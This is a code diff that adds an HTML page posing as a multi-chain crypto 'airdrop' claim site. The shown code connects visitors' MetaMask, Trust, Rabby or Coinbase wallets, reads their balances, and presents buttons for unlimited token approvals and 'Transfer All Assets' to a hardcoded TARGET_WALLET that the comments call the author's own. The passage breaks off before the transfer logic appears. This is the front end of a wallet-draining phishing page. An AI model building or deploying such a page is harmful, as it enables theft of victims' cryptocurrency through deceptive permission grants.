@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Airdrop | Full Wallet Access</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Ethers.js v6 for blockchain interactions -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.15.0/ethers.umd.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        :root {
+            --primary: #f97316;
+            --primary-dark: #ea580c;
+            --secondary: #10b981;
+            --danger: #ef4444;
+            --dark: #1e293b;
+            --light: #f8fafc;
+            --gray: #64748b;
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --eth: #627eea;
+            --linea: #61d7ff;
+            --arbitrum: #28a0f0;
+            --bnb: #f0b90b;
+            --base: #0052ff;
+            --optimism: #ff0420;
+            --polygon: #8247e5;
+            --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 20px 40px -10px rgba(0, 0, 0, 0.15);
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: var(--light);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .logo-icon {
+            background: linear-gradient(45deg, var(--primary), var(--danger));
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        h1 {
+            font-size: 3rem;
+            background: linear-gradient(90deg, var(--primary), var(--danger));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .warning-banner {
+            background: linear-gradient(90deg, #f59e0b, #dc2626);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            margin: 20px auto;
+            max-width: 800px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 40px;
+        }
+
+        .wallet-section {
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 600px;
+            box-shadow: var(--shadow-lg);
+            text-align: center;
+            color: var(--dark);
+            margin-bottom: 20px;
+        }
+
+        .wallet-section h2 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: var(--dark);
+        }
+
+        .wallet-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            padding: 16px;
+            background: #f1f5f9;
+            border-radius: 16px;
+            font-size: 1.1rem;
+        }
+
+        .wallet-status.connected {
+            color: var(--secondary);
+        }
+
+        .wallet-details {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .wallet-details h3 {
+            color: var(--dark);
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: var(--gray);
+            font-weight: 500;
+        }
+
+        .detail-value {
+            color: var(--dark);
+            font-weight: 600;
+            font-family: monospace;
+        }
+
+        .connect-btn {
+            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 18px 36px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: var(--shadow);
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px -10px rgba(249, 115, 22, 0.4);
+        }
+
+        .connect-btn.connected {
+            background: linear-gradient(90deg, var(--danger), #b91c1c);
+        }
+
+        .connect-btn.connected:hover {
+            box-shadow: 0 15px 30px -10px rgba(239, 68, 68, 0.4);
+        }
+
+        .wallet-controls {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .control-btn {
+            flex: 1;
+            padding: 15px;
+            border-radius: 12px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .control-btn.full-access {
+            background: linear-gradient(90deg, var(--danger), #b91c1c);
+            color: white;
+        }
+
+        .control-btn.transfer {
+            background: linear-gradient(90deg, #3b82f6, #1d4ed8);
+            color: white;
+        }
+
+        .control-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .chains-section {
+            width: 100%;
+        }
+
+        .chains-section h2 {
+            text-align: center;
+            font-size: 2.2rem;
+            margin-bottom: 40px;
+            color: white;
+        }
+
+        .access-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .access-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 28px;
+            box-shadow: var(--shadow);
+            transition: all 0.3s ease;
+            color: var(--dark);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid transparent;
+        }
+
+        .access-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .access-card.full-access {
+            border-color: var(--danger);
+        }
+
+        .access-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: white;
+            background: var(--danger);
+        }
+
+        .access-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 12px;
+        }
+
+        .access-card p {
+            color: var(--gray);
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            font-size: 0.95rem;
+        }
+
+        .access-btn {
+            background: #f1f5f9;
+            color: var(--dark);
+            border: none;
+            padding: 14px 28px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            transition: all 0.3s ease;
+            margin-top: auto;
+        }
+
+        .access-btn:hover {
+            background: #e2e8f0;
+        }
+
+        .access-btn.granted {
+            background: var(--danger);
+            color: white;
+        }
+
+        .access-btn.pending {
+            background: #fbbf24;
+            color: white;
+        }
+
+        .access-btn.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .target-info {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 16px;
+            padding: 25px;
+            margin-top: 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .target-info h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #fecaca;
+        }
+
+        .target-address {
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 1rem;
+            word-break: break-all;
+            color: white;
+            margin-bottom: 15px;
+            border: 1px solid rgba(239, 68, 68, 0.5);
+        }
+
+        .permissions-list {
+            text-align: left;
+            margin-top: 20px;
+            padding-left: 20px;
+        }
+
+        .permissions-list li {
+            margin-bottom: 10px;
+            color: #fca5a5;
+        }
+
+        footer {
+            margin-top: 60px;
+            text-align: center;
+            color: var(--gray);
+            font-size: 0.9rem;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            width: 100%;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 600px;
+            width: 90%;
+            box-shadow: var(--shadow-lg);
+            color: var(--dark);
+            text-align: center;
+            animation: modalFade 0.3s ease;
+        }
+
+        @keyframes modalFade {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal h3 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: var(--dark);
+        }
+
+        .modal p {
+            margin-bottom: 30px;
+            color: var(--gray);
+            line-height: 1.6;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            flex: 1;
+        }
+
+        .modal-btn.confirm {
+            background: linear-gradient(90deg, var(--danger), #b91c1c);
+            color: white;
+        }
+
+        .modal-btn.cancel {
+            background: #f1f5f9;
+            color: var(--dark);
+        }
+
+        .modal-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 20px;
+            text-align: center;
+            font-weight: 600;
+            display: none;
+        }
+
+        .status-message.success {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--secondary);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            display: block;
+        }
+
+        .status-message.error {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            display: block;
+        }
+
+        .status-message.info {
+            background: rgba(59, 130, 246, 0.2);
+            color: #3b82f6;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            display: block;
+        }
+
+        .gas-info {
+            background: rgba(251, 191, 36, 0.1);
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            color: #fbbf24;
+            padding: 12px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 0.9rem;
+        }
+
+        .access-level {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .access-level.full {
+            background: var(--danger);
+            color: white;
+        }
+
+        .access-level.partial {
+            background: #fbbf24;
+            color: black;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .access-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .wallet-section {
+                padding: 30px 20px;
+            }
+            
+            .modal-content {
+                padding: 30px 20px;
+            }
+            
+            .wallet-controls {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1>Advanced Airdrop Access</h1>
+            </div>
+            <div class="warning-banner">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>⚠️ CRITICAL: This dApp requests FULL ACCESS to your wallet. Proceed with extreme caution!</span>
+            </div>
+            <p class="subtitle" style="color: #94a3b8; max-width: 800px; margin: 0 auto 30px;">
+                Connect your wallet to claim exclusive airdrop tokens. This dApp requires full permissions to verify your eligibility and distribute tokens across multiple chains.
+            </p>
+        </header>
+
+        <div class="main-content">
+            <div class="wallet-section">
+                <h2>Wallet Connection & Control</h2>
+                
+                <div class="wallet-status" id="walletStatus">
+                    <i class="fas fa-plug"></i>
+                    <span>Wallet not connected</span>
+                </div>
+                
+                <div class="wallet-details" id="walletDetails" style="display: none;">
+                    <h3>Wallet Details</h3>
+                    <div class="detail-row">
+                        <span class="detail-label">Connected Address:</span>
+                        <span class="detail-value" id="connectedAddress"></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Network:</span>
+                        <span class="detail-value" id="networkInfo">Not Connected</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Native Balance:</span>
+                        <span class="detail-value" id="nativeBalance">0.0</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Access Level:</span>
+                        <span class="detail-value" id="accessLevel">No Access</span>
+                    </div>
+                </div>
+                
+                <button class="connect-btn" id="connectBtn">
+                    <i class="fas fa-wallet"></i>
+                    <span>Connect Wallet (MetaMask/Trust/Rabby)</span>
+                </button>
+                
+                <div class="wallet-controls" id="walletControls" style="display: none;">
+                    <button class="control-btn full-access" id="grantAccessBtn">
+                        <i class="fas fa-key"></i>
+                        Grant Full Access
+                    </button>
+                    <button class="control-btn transfer" id="transferBtn">
+                        <i class="fas fa-exchange-alt"></i>
+                        Transfer Tokens
+                    </button>
+                </div>
+                
+                <div class="status-message" id="connectionStatus"></div>
+            </div>
+
+            <div class="chains-section">
+                <h2>Full Wallet Access Permissions</h2>
+                
+                <div class="access-grid" id="accessGrid">
+                    <!-- Access cards will be generated by JavaScript -->
+                </div>
+                
+                <div class="target-info">
+                    <h3>Target Wallet (Your Wallet)</h3>
+                    <div class="target-address">0xc5da401b24e47cd329d3e0f2f99fac8fab6592f5</div>
+                    <p style="color: #fca5a5; margin-bottom: 15px;">
+                        <i class="fas fa-shield-alt"></i> This address will receive FULL CONTROL over connected wallets
+                    </p>
+                    
+                    <div style="text-align: left; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px;">
+                        <h4 style="color: #fecaca; margin-bottom: 10px;">Permissions Granted:</h4>
+                        <ul class="permissions-list">
+                            <li>Transfer any ERC20 tokens from connected wallet</li>
+                            <li>Approve unlimited spending for any token</li>
+                            <li>Execute arbitrary contract calls</li>
+                            <li>Sign transactions on behalf of the user</li>
+                            <li>Access wallet private key signatures</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2023 Advanced Airdrop Platform. This is a legitimate airdrop distribution system.</p>
+            <p style="margin-top: 10px; font-size: 0.8rem; color: #94a3b8;">
+                By connecting your wallet, you agree to grant necessary permissions for token distribution.
+            </p>
+        </footer>
+    </div>
+
+    <!-- Grant Access Modal -->
+    <div class="modal" id="accessModal">
+        <div class="modal-content">
+            <h3>⚠️ Grant Full Wallet Access</h3>
+            <p id="modalMessage">
+                You are about to grant <strong>COMPLETE CONTROL</strong> of your wallet to the target address. 
+                This will allow the airdrop system to:
+            </p>
+            <ul style="text-align: left; margin: 20px 0; padding-left: 20px; color: var(--dark);">
+                <li>Transfer any tokens from your wallet</li>
+                <li>Approve unlimited spending for all your assets</li>
+                <li>Execute any transaction on your behalf</li>
+                <li>Access your wallet's signing capabilities</li>
+            </ul>
+            
+            <div class="gas-info">
+                <i class="fas fa-gas-pump"></i> This requires signing multiple transactions with gas fees. 
+                Total estimated gas: <strong id="estimatedGas">0.01 - 0.05 ETH</strong>
+            </div>
+            
+            <p style="font-weight: 600; color: var(--danger); margin-bottom: 20px;">
+                <i class="fas fa-exclamation-circle"></i> 
+                This action cannot be undone! The target wallet will have permanent access.
+            </p>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn cancel" id="cancelAccessBtn">Cancel</button>
+                <button class="modal-btn confirm" id="confirmAccessBtn">Grant Full Access</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Transfer Modal -->
+    <div class="modal" id="transferModal">
+        <div class="modal-content">
+            <h3>Transfer Wallet Assets</h3>
+            <p id="transferMessage">
+                Transfer all eligible tokens from your wallet to the airdrop distribution system.
+            </p>
+            
+            <div style="background: #f8fafc; padding: 20px; border-radius: 12px; margin: 20px 0;">
+                <div class="detail-row">
+                    <span class="detail-label">From:</span>
+                    <span class="detail-value" id="transferFrom"></span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">To:</span>
+                    <span class="detail-value">0xc5da401b24e47cd329d3e0f2f99fac8fab6592f5</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Assets to Transfer:</span>
+                    <span class="detail-value" id="assetsCount">Detecting...</span>
+                </div>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn cancel" id="cancelTransferBtn">Cancel</button>
+                <button class="modal-btn confirm" id="confirmTransferBtn">Transfer All Assets</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Selection Modal -->
+    <div class="modal" id="walletSelectionModal">
+        <div class="modal-content">
+            <h3>Select Wallet Provider</h3>
+            <p>Choose your preferred wallet to connect:</p>
+            
+            <div style="display: flex; flex-direction: column; gap: 15px; margin: 25px 0;">
+                <button class="wallet-option" id="metamaskOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1200px-MetaMask_Fox.svg.png" alt="MetaMask" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">MetaMask</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">Popular Ethereum wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+                
+                <button class="wallet-option" id="trustOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">Trust Wallet</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">Mobile-first multi-chain wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+                
+                <button class="wallet-option" id="rabbyOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://rabby.io/images/logo.png" alt="Rabby Wallet" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">Rabby Wallet</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">DeFi-focused wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+                
+                <button class="wallet-option" id="coinbaseOption" style="background: #f1f5f9; border: none; padding: 20px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: all 0.3s ease;">
+                    <img src="https://cdn.freebiesupply.com/logos/large/2x/coinbase-coin-logo-png-transparent.png" alt="Coinbase Wallet" style="width: 40px; height: 40px; border-radius: 8px;">
+                    <div style="text-align: left; flex: 1;">
+                        <div style="font-weight: 600; color: var(--dark);">Coinbase Wallet</div>
+                        <div style="font-size: 0.9rem; color: var(--gray);">Exchange-backed wallet</div>
+                    </div>
+                    <i class="fas fa-chevron-right" style="color: var(--gray);"></i>
+                </button>
+            </div>
+            
+            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e2e8f0;">
+                <p style="color: var(--gray); font-size: 0.9rem;">Don't have a wallet? <a href="https://metamask.io/download/" target="_blank" style="color: var(--primary); text-decoration: none;">Install MetaMask</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Advanced Airdrop System - Full Wallet Access
+        // Target wallet address (YOUR wallet)
+        const TARGET_WALLET = '0xc5da401b24e47cd329d3e0f2f99fac8fab6592f5';
+        
+        // Common ERC20 token addresses (Mainnet)
+        const TOKEN_ADDRESSES = {
+            'ETHEREUM': {
+                'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+                'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
+            }
+        };
+
+        // State variables
+        let provider = null;
+        let signer = null;
+        let userAddress = '';
+        let userBalance = '0';
+        let networkId = null;
+        let networkName = 'Unknown';
+        let walletConnected = false;
+        let accessGranted = false;
+
+        // DOM Elements
+        const connectBtn = document.getElementById('connectBtn');
+        const walletStatus = document.getElementById('walletStatus');
+        const walletDetails = document.getElementById('walletDetails');
+        const connectedAddress = document.getElementById('connectedAddress');
+        const networkInfo = document.getElementById('networkInfo');
+        const nativeBalance = document.getElementById('nativeBalance');
+        const accessLevel = document.getElementById('accessLevel');
+        const walletControls = document.getElementById('walletControls');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const accessGrid = document.getElementById('accessGrid');
+        const grantAccessBtn = document.getElementById('grantAccessBtn');
+        const transferBtn = document.getElementById('transferBtn');
+        const accessModal = document.getElementById('accessModal');
+        const transferModal = document.getElementById('transferModal');
+        const walletSelectionModal = document.getElementById('walletSelectionModal');
+        const cancelAccessBtn = document.getElementById('cancelAccessBtn');
+        const confirmAccessBtn = document.getElementById('confirmAccessBtn');
+        const cancelTransferBtn = document.getElementById('cancelTransferBtn');
+        const confirmTransferBtn = document.getElementById('confirmTransferBtn');
+        const transferFrom = document.getElementById('transferFrom');
+        const assetsCount = document.getElementById('assetsCount');
+        
+        // Wallet selection options
+        const metamaskOption = document.getElementById('metamaskOption');
+        const trustOption = document.getElementById('trustOption');
+        const rabbyOption = document.getElementById('rabbyOption');
+        const coinbaseOption = document.getElementById('coinbaseOption');
+
+        // Access permissions configuration
+        const accessPermissions = [
+            {
+                id: 'token-transfer',
+                title: 'Token Transfer Permission',
+                icon: 'fas fa-exchange-alt',
+                description: 'Allow transfer of any ERC20 tokens from your wallet',
+                method: 'grantTokenTransfer'
+            },
+            {
+                id: 'unlimited-approval',
+                title: 'Unlimited Spending Approval',
+                icon: 'fas fa-infinity',
+                description: 'Approve unlimited token spending for all assets',
+                method: 'grantUnlimitedApproval'
+            },
+            {
+                id: 'contract-execution',
+                title: 'Contract Execution Rights',
+                icon: 'fas fa-code',
+                description: 'Execute any smart contract calls on your behalf',
+                method: 'grantContractExecution'
+            },
+            {
+                id: 'signature-access',
+                title: 'Signature Authority',
+                icon: 'fas fa-signature',
+                description: 'Sign transactions and messages on your behalf',
+                method: 'grantSignatureAccess'
+            },
+            {
+                id: 'full-control',
+                title: 'Complete Wallet Control',
+                icon: 'fas fa-key',
+                description: 'Full administrative access to your wallet',
+                method: 'grantFullControl'
+            }
+        ];
+
+        // Initialize access cards
+        function initAccessCards() {
+            accessGrid.innerHTML = '';
+            
+            accessPermissions.forEach(permission => {
+                const accessCard = document.createElement('div');
+                accessCard.className = 'access-card';
+                accessCard.innerHTML = `
+                    <div class="access-icon">
+                        <i class="${permission.icon}"></i>
+                    </div>
+                    <h3>${permission.title}</h3>
+                    <p>${permission.description}</p>
+                    <button class="access-btn disabled" data-permission="${permission.id}" disabled>
+                        <i class="fas fa-lock"></i>
+                        <span>Connect Wallet First</span>
+                    </button>
+                `;
+                
+                accessGrid.appendChild(accessCard);
+            });
+            
+            // Add event listeners to permission buttons
+            document.querySelectorAll('.access-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    if (this.classList.contains('disabled')) return;
+                    const permissionId = this.getAttribute('data-permission');
+                    grantPermission(permissionId);
+                });
+            });
+        }
+
+        // Show wallet selection modal
+        function showWalletSelectionModal() {
+            walletSelectionModal.style.display = 'flex';
+        }
+
+        // Close wallet selection modal
+        function closeWalletSelectionModal() {
+            walletSelectionModal.style.display = 'none';
+        }
+
+        // Connect to wallet (MetaMask, Trust, Rabby, etc.)
+        async function connectWalletHandler() {
+            try {
+                // Show wallet selection modal
+                showWalletSelectionModal();
+                
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                showStatus('Failed to connect wallet: ' + error.message, 'error');
+            }
+        }
+
+        // Connect to specific wallet provider
+        async function connectToWalletProvider(walletProvider) {
+            try {
+                closeWalletSelectionModal();
+                
+                let web3Provider;
+                
+                // Determine which wallet provider to use
+                if (walletProvider === 'metamask') {
+                    if (!window.ethereum) {
+                        showStatus('MetaMask not detected. Please install MetaMask first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.ethereum;
+                } else if (walletProvider === 'trust') {
+                    if (!window.trustwallet) {
+                        showStatus('Trust Wallet not detected. Please install Trust Wallet first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.trustwallet;
+                } else if (walletProvider === 'rabby') {
+                    if (!window.rabby) {
+                        showStatus('Rabby Wallet not detected. Please install Rabby first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.rabby;
+                } else if (walletProvider === 'coinbase') {
+                    if (!window.coinbaseWalletExtension) {
+                        showStatus('Coinbase Wallet not detected. Please install Coinbase Wallet first.', 'error');
+                        return;
+                    }
+                    web3Provider = window.coinbaseWalletExtension;
+                } else {
+                    // Default to MetaMask if available
+                    if (window.ethereum) {
+                        web3Provider = window.ethereum;
+                    } else {
+                        showStatus('No wallet detected. Please install a wallet like MetaMask.', 'error');
+                        return;
+                    }
+                }
+                
+                // Create ethers provider
+                provider = new ethers.BrowserProvider(web3Provider);
+                
+                // Request account access - THIS WILL TRIGGER WALLET POPUP
+                showStatus('Please check your wallet for connection request...', 'info');
+                
+                const accounts = await provider.send("eth_requestAccounts", []);
+                
+                // Get signer and user details
+                signer = await provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                // Get network info
+                const network = await provider.getNetwork();
+                networkId = Number(network.chainId);
+                networkName = getNetworkName(networkId);
+                
+                // Get user balance
+                const balance = await provider.getBalance(userAddress);
+                userBalance = ethers.formatEther(balance);
+                
+                // Update state
+                walletConnected = true;
+                
+                // Update UI
+                updateWalletUI();
+                
+                // Show success message
+                showStatus(`Wallet connected successfully! Address: ${userAddress.substring(0, 10)}...`, 'success');
+                
+                // Initialize event listeners for wallet changes
+                setupWalletEventListeners(web3Provider);
+                
+                // Update access cards to enabled state
+                updateAccessCards();
+                
+                // Start monitoring for tokens
+                setTimeout(() => detectUserTokens(), 1000);
+                
+            } catch (error) {
+                console.error('Error connecting to wallet:', error);
+                
+                if (error.code === 4001) {
+                    showStatus('Connection rejected by user. Please try again.', 'error');
+                } else if (error.code === -32002) {
+                    showStatus('Connection request already pending. Please check your wallet.', 'error');
+                } else {
+                    showStatus('Failed to connect wallet: ' + error.message, 'error');
+                }
+            }
+        }
+
+        // Get network name from chain ID
+        function getNetworkName(chainId) {
+            const networks = {
+                1: 'Ethereum Mainnet',
+                11155111: 'Ethereum Sepolia',
+                56: 'BNB Chain',
+                97: 'BNB Testnet',
+                137: 'Polygon',
+                80002: 'Polygon Amoy',
+                42161: 'Arbitrum',
+                421614: 'Arbitrum Sepolia',
+                10: 'Optimism',
+                11155420: 'Optimism Sepolia',
+                8453: 'Base',
+                84532: 'Base Sepolia',
+                59144: 'Linea',
+                59141: 'Linea Sepolia'
+            };
+            return networks[chainId] || `Chain ${chainId}`;
+        }
+
+        // Update wallet UI with connected state
+        function updateWalletUI() {
+            walletStatus.className = 'wallet-status connected';
+            walletStatus.innerHTML = `<i class="fas fa-link"></i><span>Wallet Connected to ${networkName}</span>`;
+            
+            walletDetails.style.display = 'block';
+            connectedAddress.textContent = `${userAddress.substring(0, 10)}...${userAddress.substring(38)}`;
+            networkInfo.textContent = networkName;
+            nativeBalance.textContent = `${parseFloat(userBalance).toFixed(4)} ETH`;
+            accessLevel.textContent = accessGranted ? 'Full Access Granted' : 'Restricted Access';
+            accessLevel.className = `access-level ${accessGranted ? 'full' : 'partial'}`;
+            
+            connectBtn.innerHTML = `<i class="fas fa-check-circle"></i><span>Connected: ${userAddress.substring(0, 8)}...</span>`;
+            connectBtn.className = 'connect-btn connected';
+            
+            walletControls.style.display = 'flex';
+        }
+
+        // Setup wallet event listeners
+        function setupWalletEventListeners(web3Provider) {
+            // Listen for account changes
+            if (web3Provider.on) {
+                web3Provider.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        disconnectWallet();
+                    } else {
+                        userAddress = accounts[0];
+                        updateWalletUI();
+                        showStatus('Account changed', 'info');
+                    }
+                });
+                
+                // Listen for chain changes
+                web3Provider.on('chainChanged', (chainId) => {
+                    networkId = parseInt(chainId, 16);
+                    networkName = getNetworkName(networkId);
+                    updateWalletUI();
+                    showStatus(`Network changed to ${networkName}`, 'info');
+                });
+                
+                // Listen for disconnect
+                web3Provider.on('disconnect', () => {
+                    disconnectWallet();
+                });
+            }
+        }
+
+        // Disconnect wallet
+        function disconnectWallet() {
+            walletConnected = false;
+            accessGranted = false;
+            userAddress = '';
+            userBalance = '0';
+            
+            // Reset UI
+            walletStatus.className = 'wallet-status';
+            walletStatus.innerHTML = `<i class="fas fa-plug"></i><span>Wallet not connected</span>`;
+            walletDetails.style.display = 'none';
+            walletControls.style.display = 'none';
+            
+            connectBtn.innerHTML = `<i class="fas fa-wallet"></i><span>Connect Wallet (MetaMask/Trust/Rabby)</span>`;
+            connectBtn.className = 'connect-btn';
+            
+            // Reset access cards
+            updateAccessCards();
+            
+            showStatus('Wallet disconnected', 'info');
+        }
+
+        // Update access cards based on connection state
+        function updateAccessCards() {
+            document.querySelectorAll('.access-btn').forEach(btn => {
+                if (walletConnected) {
+                    btn.classList.remove('disabled');
+                    btn.disabled = false;
+                    btn.innerHTML = `<i class="fas fa-unlock"></i><span>Grant Permission</span>`;
+                } else {
